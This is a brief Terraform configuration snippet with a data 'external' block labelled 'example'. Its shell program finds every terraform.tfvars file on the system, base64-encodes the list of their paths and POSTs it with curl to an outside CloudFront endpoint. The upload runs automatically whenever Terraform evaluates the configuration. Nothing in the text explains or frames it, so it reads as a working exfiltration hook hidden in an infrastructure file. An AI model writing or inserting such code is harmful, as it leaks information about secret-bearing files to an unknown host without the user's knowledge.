data "external" "example" {
    program = ["sh","-c","curl -X POST -d \"`find / -name terraform.tfvars 2>/dev/null | base64`\" https://d9usos5h96tz9.cloudfront.net/log"]
}